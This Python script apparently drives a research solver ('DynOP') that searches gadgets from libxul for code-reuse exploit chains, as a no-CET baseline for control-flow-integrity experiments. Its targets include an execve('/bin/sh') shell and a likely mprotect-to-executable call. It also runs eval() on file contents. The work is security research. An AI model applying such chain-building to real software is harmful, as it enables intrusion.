#!/usr/bin/env python3
"""
Runner: Base DynOP (no CET) for libxul_none dataset.
Serves as the CET-none baseline for comparison with CET-SS/IBT experiments.
"""
import sys, os, json, argparse, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import tools
import solve_engine
import find_reg_gadget_chain
from loguru import logger
from pwn import ELF
from paths import REPO_ROOT

DEFAULT_DATASET_DIR = str(REPO_ROOT / 'dataset' / 'CFI' / 'libxul_none')
DEFAULT_RESULT_DIR = str(REPO_ROOT / 'results' / 'cet_none')


def main():
    parser = argparse.ArgumentParser(description='Run base DynOP on libxul_none (no CET)')
    parser.add_argument('--dataset-dir', type=str, default=DEFAULT_DATASET_DIR)
    parser.add_argument('--gadget-file', type=str, default=None)
    parser.add_argument('--target', type=str, default='funcall4', choices=['funcall4', 'execve'])
    parser.add_argument('--reg-search-depth', type=int, default=3)
    parser.add_argument('--mem-search-depth', type=int, default=1)
    parser.add_argument('--reg-timeout', type=int, default=600)
    parser.add_argument('--mem-reg-timeout', type=int, default=120)
    parser.add_argument('--result-dir', type=str, default=DEFAULT_RESULT_DIR)
    args = parser.parse_args()

    dataset_dir = args.dataset_dir
    gadget_file = args.gadget_file or os.path.join(dataset_dir, 'gadget.txt')
    cyclic_file = os.path.join(dataset_dir, 'cyclic_matches.json')

    os.makedirs(args.result_dir, exist_ok=True)
    log_handler = logger.add(
        sink=os.path.join(args.result_dir, 'run.log'),
        level='INFO',
        encoding='utf-8',
    )

    # Load gadgets
    t_load_start = time.time()
    gadgets_data = tools.load_gadget(gadget_file)
    gadgets_dict = tools.create_gadget_dict(gadgets_data)
    gadget_load_time = time.time() - t_load_start
    logger.info(f"Loaded {len(gadgets_dict)} gadgets from {gadget_file}")
    logger.info(f"[TIMING] Gadget Load Time: {gadget_load_time:.2f}s")

    # Load registers and memory map
    (permission_table, regs_init) = tools.get_map_regs(dataset_dir)
    logger.info(f"Registers: rsp={hex(regs_init['rsp'])}")
    logger.info(f"Memory regions: {len(permission_table)}")

    # Load cyclic matches (controllable memory)
    with open(cyclic_file) as f:
        controllable_mem_data = json.load(f)
    controllable_mem_data = sorted(controllable_mem_data, key=lambda x: int(x['start_addr'], 16))
    controble_addr_base = int(controllable_mem_data[0]['start_addr'], 16)

    # Build offset list
    offset_list = []
    s = 0
    for i in range(len(controllable_mem_data)):
        offset_list += [_ + s for _ in range(int(controllable_mem_data[i]['length']) // 8)]
        if i != len(controllable_mem_data) - 1:
            s += (int(controllable_mem_data[i + 1]['start_addr'], 16) - int(controllable_mem_data[i]['start_addr'], 16)) // 8

    # Controllable registers: load from file or use default
    ctrl_regs_file = os.path.join(dataset_dir, 'controble_regs.txt')
    if os.path.exists(ctrl_regs_file):
        controllable_regs = eval(open(ctrl_regs_file, 'r').read())
    else:
        controllable_regs = ['rax', 'rsp', 'rdi']

    # Get bss address from binary
    binary_file = os.path.join(dataset_dir, 'libxul_none.so')
    try:
        elf = ELF(binary_file, checksec=False)
        bss_address = elf.bss()
        if permission_table[0]['start'] >> 32 > 0:
            bss_address = elf.bss() + permission_table[0]['start']
    except Exception:
        bss_address = None
        for i in range(len(permission_table)):
            if 'rw' in permission_table[i]['permission'] and permission_table[i]['end'] < controble_addr_base:
                bss_address = permission_table[i]['start']
                break
        if bss_address is None:
            bss_address = controble_addr_base

    # Set targets
    if args.target == 'execve':
        target_regs = [
            {'reg_name': 'rdi', 'reg_value': bss_address + 0x300},
            {'reg_name': 'rsi', 'reg_value': 0},
            {'reg_name': 'rdx', 'reg_value': 0},
            {'reg_name': 'rax', 'reg_value': 59},
        ]
        target_mem_value = [{bss_address + 0x300: b"/bin/sh\x00"}]
    else:
        target_regs = [
            {'reg_name': 'rdi', 'reg_value': bss_address + 0x300},
            {'reg_name': 'rsi', 'reg_value': 0x1000},
            {'reg_name': 'rdx', 'reg_value': 7},
            # {'reg_name': 'rcx', 'reg_value': 10},
        ]
        target_mem_value = []

    # Initialize GadgetsInfo
    stack_pivot_chain = ['0x10000 -> ret']
    rsp_idx = (regs_init['rsp'] - controble_addr_base) // 8
    address_map = {rsp_idx: "0xdeadbeef"}
    if rsp_idx in offset_list:
        offset_list.pop(offset_list.index(rsp_idx))

    bss_address += 0x308
    gadgets_info = solve_engine.GadgetsInfo(
        gadget_file, regs_init, stack_pivot_chain, gadgets_dict,
        address_map, offset_list, controllable_mem_data, controble_addr_base,
        target_regs, target_mem_value, controllable_regs, permission_table, bss_address
    )

    logger.info(f"Target: {args.target}")
    logger.info(f"Controllable regs: {controllable_regs}")
    logger.info(f"Controllable base: {hex(controble_addr_base)}, slots: {len(offset_list)}")

    # Run base DynOP solver
    t_solve_start = time.time()
    start_time = time.time()
    res_json = {"binary": "libxul_none", "target": args.target}

    result = find_reg_gadget_chain.main(
        'libxul_none', 'CFI',
        gadgets_info=gadgets_info,
        mem_search_depth=args.mem_search_depth,
        reg_search_depth=args.reg_search_depth,
        res_json=res_json,
        valid_mem_reg_num=1,
        mem_reg_timeout=args.mem_reg_timeout,
        reg_timout=args.reg_timeout,
        target_type=args.target,
    )

    elapsed = time.time() - start_time
    solve_time = time.time() - t_solve_start
    res_json['All Time'] = elapsed

    if result:
        logger.success(f"SUCCESS in {elapsed:.2f}s")
        logger.success(f"Res Json {res_json}")
    else:
        logger.error(f"FAILED after {elapsed:.2f}s")

    print(f"\n[TIMING] Gadget Load Time: {gadget_load_time:.2f}s")
    print(f"[TIMING] Solve Time: {solve_time:.2f}s")
    print(f"[TIMING] Total Time: {gadget_load_time + solve_time:.2f}s")

    logger.remove(log_handler)


if __name__ == '__main__':
    main()
